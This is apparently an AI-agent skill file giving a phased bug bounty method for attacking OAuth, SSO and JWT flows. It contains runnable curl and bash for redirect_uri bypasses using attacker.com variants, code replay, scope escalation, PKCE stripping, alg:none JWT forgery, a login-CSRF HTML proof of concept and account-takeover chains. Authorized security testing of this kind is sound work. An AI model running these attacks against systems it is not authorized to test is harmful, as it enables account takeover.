---
name: oauth-hunter
description: Systematically test OAuth 2.0 flows, SSO implementations, JWT tokens, and authentication mechanisms for vulnerabilities including state parameter bypass, redirect_uri manipulation, authorization code interception, token leakage, JWT algorithm confusion, and account takeover chains. Use this skill whenever a target implements OAuth, OpenID Connect, SSO, social login, or JWT-based authentication. Trigger on phrases like "test OAuth", "auth flow testing", "SSO vulnerabilities", "JWT testing", "social login bypass", "account takeover via OAuth", or when recon reveals /oauth/, /auth/, /connect/, /sso/, or /.well-known/openid-configuration endpoints.
---

# OAuth Hunter Skill

You are auditing an OAuth 2.0 or authentication flow implementation. OAuth vulnerabilities are among the highest-impact findings in bug bounty — a single misconfiguration can enable full account takeover without any user interaction. Implementations vary wildly: a custom OAuth server behaves differently from Auth0, Okta, or Cognito, and each has its own known weak points.

Run the phases in order. Do not skip Phase 1 — the grant type and implementation details determine which attacks are applicable.

---

## Phase 1 — Reconnaissance and Flow Mapping

### Step 1.1 — Discover OAuth and Auth Endpoints

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/oauth

# Pull known OAuth/auth paths from existing recon
grep -iE '/(oauth|auth|connect|sso|login|logout|token|authorize|callback|
           openid|saml|jwt|session|identity|account/auth|api/auth|v[0-9]/auth)' \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/js/endpoints.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/oauth/auth-endpoints.txt

echo "[*] Auth-related endpoints:"
cat $TARGET_DIR/recon/oauth/auth-endpoints.txt
```

### Step 1.2 — OpenID Configuration Discovery

```bash
# OpenID Connect discovery document — reveals all endpoints and supported features
for host in $(head -10 $TARGET_DIR/recon/subdomains/live-hostnames.txt); do
  for path in \
    "/.well-known/openid-configuration" \
    "/.well-known/oauth-authorization-server" \
    "/oauth/.well-known/openid-configuration" \
    "/auth/realms/master/.well-known/openid-configuration" \
    "/.well-known/jwks.json" \
    "/oauth/jwks" \
    "/jwks.json"; do
    status=$(curl -sk -o /dev/null -w "%{http_code}" "https://$host$path" --max-time 5)
    if [ "$status" = "200" ]; then
      echo "[FOUND] https://$host$path"
      curl -sk "https://$host$path" | python3 -m json.tool 2>/dev/null | head -40
    fi
  done
done | tee $TARGET_DIR/recon/oauth/discovery.txt
```

**From the discovery document, extract and record:**
- `authorization_endpoint` — where the OAuth flow starts
- `token_endpoint` — where codes are exchanged for tokens
- `userinfo_endpoint` — where user profile is fetched
- `jwks_uri` — public keys used to verify JWTs
- `grant_types_supported` — which flows are enabled
- `response_types_supported` — code, token, id_token combinations

### Step 1.3 — Identify Grant Type and Flow

Browse through the auth flow manually and record:

| Parameter | Value |
|---|---|
| `response_type` | `code` / `token` / `id_token` / hybrid |
| `client_id` | [value] |
| `redirect_uri` | [value] |
| `scope` | [values] |
| `state` | [present/absent/static] |
| `code_challenge` | [present/absent — PKCE?] |
| `nonce` | [present/absent] |
| Provider type | Custom / Auth0 / Okta / Cognito / Keycloak / Azure AD / Google |

Save:
```bash
echo "Flow mapping" > $TARGET_DIR/recon/oauth/flow-map.txt
# Append observed values from above table
```

---

## Phase 2 — State and CSRF Testing

### Step 2.1 — State Parameter Validation

The `state` parameter prevents CSRF attacks on the OAuth callback. Test three conditions:

**Test A — State absent:**
Initiate the OAuth flow without a `state` parameter:
```
https://[auth-server]/oauth/authorize?
  client_id=[id]&
  redirect_uri=[callback]&
  response_type=code&
  scope=openid
  (no state parameter)
```
If the server accepts the request and completes authorization → state not enforced.

**Test B — Static/predictable state:**
Initiate two separate OAuth flows. Compare the `state` values. If they are identical, sequential, or follow a pattern → state is not cryptographically random.

**Test C — State not verified on callback:**
Complete a legitimate flow to capture a valid `code` and `state`. Then replay the callback URL with the `state` value changed or removed:
```
https://[app]/oauth/callback?code=[valid-code]&state=TAMPERED
```
If the app accepts the callback → state not validated on return.

**If any test passes:** Document as CSRF on OAuth callback. This enables login CSRF — attacker can force-authenticate victim to attacker's account, or steal the victim's session if combined with a redirect.

### Step 2.2 — Pre-Auth CSRF (Login CSRF)

If state is missing or not validated:
```html
<!-- PoC page to force victim into attacker OAuth flow -->
<html><body>
<img src="https://[app]/oauth/callback?code=[attacker-auth-code]&state=[any]" />
</body></html>
```
If victim loads this page and gets logged into the attacker's account → login CSRF confirmed.

---

## Phase 3 — Redirect URI Manipulation

The `redirect_uri` is the most commonly misconfigured OAuth parameter. Test all variants:

### Step 3.1 — Open Redirect via redirect_uri

```bash
BASE_AUTH="https://[auth-server]/oauth/authorize?client_id=[id]&response_type=code&scope=openid"
REGISTERED_URI="https://app.target.com/oauth/callback"

# Test variants — check if auth server accepts them
VARIANTS=(
  # Path traversal
  "https://app.target.com/oauth/callback/../../../attacker.com"
  "https://app.target.com/oauth/callback%2F..%2F..%2Fattacker.com"
  # Different path
  "https://app.target.com/oauth/callback/extra"
  "https://app.target.com/other-path"
  # Subdomain
  "https://evil.app.target.com/oauth/callback"
  "https://app.target.com.attacker.com/oauth/callback"
  # Different scheme
  "http://app.target.com/oauth/callback"
  # Localhost
  "http://localhost/oauth/callback"
  "http://127.0.0.1/oauth/callback"
)

for URI in "${VARIANTS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$URI'))")
  RESPONSE=$(curl -sk -o /dev/null -w "%{http_code} %{redirect_url}" \
    "$BASE_AUTH&redirect_uri=$ENCODED" --max-time 5)
  echo "[$RESPONSE] $URI"
done | tee $TARGET_DIR/recon/oauth/redirect-uri-tests.txt
```

### Step 3.2 — Authorization Code Leakage via Referrer

If a relaxed `redirect_uri` is accepted that points to a page with third-party resources (analytics, CDN, ads):
1. Authorization code lands at the accepted URI
2. That page loads a third-party script
3. The `Referer` header carries the `?code=` value to the third party

**Check:** Does any accepted `redirect_uri` destination load third-party JS?
```bash
# Fetch the callback page and check for third-party script sources
curl -sk "$REGISTERED_URI" | grep -iE '(src|href)=["\x27](https?://[^"\x27]*)["\x27]' | \
  grep -v "target\.com" | head -20
```

### Step 3.3 — Wildcard and Regex Bypass

Test whether the server uses prefix-matching rather than exact-matching:
```bash
# Append extra path components
curl -sk -o /dev/null -w "%{http_code}" \
  "$BASE_AUTH&redirect_uri=https://app.target.com/oauth/callback?extra=param" --max-time 5

# Try registered domain with different TLD (typosquatting check)
curl -sk -o /dev/null -w "%{http_code}" \
  "$BASE_AUTH&redirect_uri=https://app.target.co/oauth/callback" --max-time 5
```

---

## Phase 4 — Token and Code Testing

### Step 4.1 — Authorization Code Replay

Authorization codes must be single-use. After a successful OAuth flow, capture the `code` from the callback URL before it is exchanged, then attempt to exchange it a second time:

```bash
# Replay the code exchange request
curl -sk -X POST "https://[auth-server]/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code" \
  -d "code=[already-used-code]" \
  -d "client_id=[id]" \
  -d "client_secret=[secret-if-known]" \
  -d "redirect_uri=[registered-uri]" | python3 -m json.tool
```

If a token is returned for an already-exchanged code → codes are not invalidated after use.

### Step 4.2 — Token Scope Escalation

Test whether the server enforces the `scope` parameter or allows requesting broader scopes than registered:

```bash
BASE_AUTH="https://[auth-server]/oauth/authorize?client_id=[id]&response_type=code&redirect_uri=[uri]"

# Request elevated scopes not granted to this client
for SCOPE in "admin" "read:all" "write:all" "openid profile email phone address" \
             "offline_access" "api" "superuser" "internal"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$SCOPE'))")
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "$BASE_AUTH&scope=$ENCODED" --max-time 5)
  echo "[$STATUS] scope=$SCOPE"
done
```

### Step 4.3 — PKCE Downgrade (if PKCE present)

If the flow uses PKCE (`code_challenge` parameter), test whether PKCE can be stripped:

```bash
# Initiate flow WITHOUT code_challenge even though app sends one
# If the server accepts the authorization request without code_challenge:
STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
  "$BASE_AUTH&response_type=code&scope=openid" \
  --max-time 5)
echo "PKCE-stripped authorize: $STATUS"

# If code is issued, try exchanging it without code_verifier
curl -sk -X POST "https://[auth-server]/oauth/token" \
  -d "grant_type=authorization_code&code=[code]&client_id=[id]&redirect_uri=[uri]"
  # No code_verifier included
```

---

## Phase 5 — JWT Testing

### Step 5.1 — Collect JWT Tokens

```bash
# Capture JWTs from auth responses, cookies, and local storage references
# Look for tokens in:
# - Authorization: Bearer <token> headers in API responses
# - Set-Cookie headers with JWT-shaped values
# - JSON response bodies with access_token / id_token / refresh_token

# Decode without verification (base64)
TOKEN="[jwt here]"
HEADER=$(echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool)
PAYLOAD=$(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool)
echo "=== HEADER ==="
echo $HEADER
echo "=== PAYLOAD ==="
echo $PAYLOAD
```

### Step 5.2 — Algorithm Confusion Attacks

**alg: none attack** — strip the signature and set algorithm to none:
```bash
# Construct a tampered JWT with alg:none
TAMPERED_HEADER=$(echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
ORIG_PAYLOAD=$(echo $TOKEN | cut -d. -f2)

# Tamper payload (e.g. escalate role or change user ID)
TAMPERED_PAYLOAD=$(echo '{"sub":"admin","role":"administrator","iat":1700000000}' | \
  base64 | tr -d '=' | tr '+/' '-_')

TAMPERED_JWT="$TAMPERED_HEADER.$TAMPERED_PAYLOAD."
echo "Tampered JWT: $TAMPERED_JWT"

# Test tampered JWT against authenticated endpoint
curl -sk -H "Authorization: Bearer $TAMPERED_JWT" \
  "https://$TARGET_DOMAIN/api/profile" | python3 -m json.tool
```

**RS256 → HS256 confusion** — if token uses RS256, test whether the server accepts HS256 signed with the public key:
```bash
# Fetch the public key from JWKS endpoint
curl -sk "$(grep jwks_uri $TARGET_DIR/recon/oauth/discovery.txt | grep -oP 'https://[^"]+')" | \
  python3 -m json.tool > $TARGET_DIR/recon/oauth/jwks.json

echo "[*] JWKS saved. Test RS256->HS256 confusion manually using:"
echo "    jwt_tool -t https://$TARGET_DOMAIN/api/profile -rh 'Authorization: Bearer $TOKEN' -X k"
```

### Step 5.3 — JWT Claims Tampering

Even without algorithm confusion, test whether signature validation is enforced:

```bash
# Flip a single bit in the signature to test validation
SIG=$(echo $TOKEN | cut -d. -f3)
TAMPERED_SIG=$(echo $SIG | sed 's/./X/')
TAMPERED_TOKEN="$(echo $TOKEN | cut -d. -f1).$(echo $TOKEN | cut -d. -f2).$TAMPERED_SIG"

curl -sk -H "Authorization: Bearer $TAMPERED_TOKEN" \
  "https://$TARGET_DOMAIN/api/profile" -w "\n[%{http_code}]"
# If 200 returned — signature not validated
```

### Step 5.4 — JWT Expiry and Key Confusion

```bash
# Test expired token acceptance
# Decode payload, check 'exp' claim
EXP=$(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c \
  "import sys,json; d=json.load(sys.stdin); print(d.get('exp','not set'))")
NOW=$(date +%s)
echo "Token exp: $EXP | Now: $NOW | Expired: $([ $EXP -lt $NOW ] && echo YES || echo NO)"

# If token is expired, test whether it's still accepted
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://$TARGET_DOMAIN/api/profile" -w "\n[%{http_code}]"
```

---

## Phase 6 — Account Takeover Chains

### Step 6.1 — Pre-Authentication Account Linking

If the app supports both local password login and OAuth (social login), test account linking:

1. Register a local account with `victim@email.com`
2. Initiate the OAuth flow (Google/GitHub/etc.) using a provider account that has `victim@email.com` as the verified email
3. Check if the OAuth login is automatically linked to the existing local account

If yes → account takeover: attacker who controls a social account with the victim's email can take over the local account.

### Step 6.2 — Email Verification Bypass via OAuth

```bash
# Create a local account with unverified email
# Then log in via OAuth provider that has the same email (verified)
# Check if OAuth login bypasses the email verification requirement
echo "[MANUAL] Test: register with email, skip verification, log in via OAuth with same email"
echo "If login succeeds — email verification is bypassable via OAuth"
```

### Step 6.3 — Account Takeover via Unvalidated email_verified Claim

Some apps trust the `email` claim from OAuth providers without checking `email_verified`:

```bash
# Decode the id_token and check for email_verified claim
ID_TOKEN="[id_token from OAuth response]"
echo $ID_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | \
  python3 -c "import sys,json; d=json.load(sys.stdin); \
  print('email:', d.get('email')); print('email_verified:', d.get('email_verified', 'NOT PRESENT'))"

# If email_verified is absent or false but app accepts the email claim—
# set up a provider account with target email, do not verify, and attempt OAuth login
```

### Step 6.4 — Token Leakage via Referer / postMessage

```bash
# Check if access_token appears in the URL fragment on callback (implicit flow)
# Fragment values are sent to the browser but not the server, but can leak via:
# - window.location passed to analytics scripts
# - postMessage to parent windows
# - document.referrer on subsequent navigations

# Look for implicit flow indicators in JS recon output
grep -iE '(response_type=token|id_token|#access_token|fragment|postMessage|
           window\.location|document\.referrer)' \
  $TARGET_DIR/recon/js/endpoints.txt \
  $TARGET_DIR/recon/js/secrets.txt 2>/dev/null
```

---

## Phase 7 — Provider-Specific Checks

### Auth0
- Test `/authorize?connection=` parameter for connection injection
- Check for `prompt=none` silent auth abuse (auto-login without user interaction)
- Test universal login bypass via direct API calls to `/oauth/token`

### Keycloak
- Test `/auth/realms/[realm]/protocol/openid-connect/` endpoints for open endpoints
- Check for `nonce` reuse tolerance
- Test realm enumeration via error message differences

### Azure AD / Entra ID
- Test `login_hint` parameter for username enumeration
- Check `domain_hint` for bypassing MFA requirements
- Test multi-tenant configurations for cross-tenant token acceptance

### Custom Implementations
- Always test all redirect_uri variants (most likely to be misconfigured)
- Always test state parameter validation (often skipped in custom implementations)
- Check token storage in client-side localStorage (XSS-accessible)

---

## Output Summary

All output files written to `$TARGET_DIR/recon/oauth/`:

| File | Contents |
|---|---|
| `auth-endpoints.txt` | All discovered auth/OAuth-related endpoints |
| `discovery.txt` | OpenID Connect discovery document contents |
| `flow-map.txt` | Mapped grant type, parameters, provider |
| `redirect-uri-tests.txt` | redirect_uri manipulation test results |
| `jwks.json` | JWKS public key material |

---

## Severity Reference

| Finding | Severity |
|---|---|
| Account takeover via redirect_uri + code interception | Critical |
| ATO via OAuth account linking (pre-auth) | Critical |
| JWT alg:none / RS256→HS256 confusion accepted | Critical |
| State parameter absent / not validated (login CSRF) | High |
| Authorization code reuse (single-use not enforced) | High |
| ATO via unverified email claim | High |
| PKCE downgrade accepted | High |
| Token leakage via Referer | Medium |
| Scope escalation (unauthorized scopes granted) | Medium |
| JWT expiry not enforced | Medium |
| Username enumeration via login_hint | Low |

---

## Guiding Principles

- **Map the full flow before testing anything.** The grant type, PKCE presence, state handling, and provider type determine which attacks are in scope. Testing blind wastes time and misses the most impactful variants.
- **redirect_uri misconfigurations are the most common OAuth critical.** Spend disproportionate time here. Test every bypass variant systematically before moving on.
- **State parameter absence alone is not a finding without a plausible attack scenario.** Describe the specific login CSRF scenario and demonstrate that it results in account compromise or session confusion.
- **JWT signature validation must be confirmed by flipping a bit.** Do not assume it is validated. A server that returns 200 for a signature-tampered token is missing validation entirely.
- **Account linking attacks require evidence of actual cross-account access.** Do not claim ATO without demonstrating that the victim account is accessible after the exploit.
- **Run /triager before submitting any OAuth finding.** Partial findings (e.g. state absent but no attack scenario) will be N/A'd. Confirm the full impact chain.
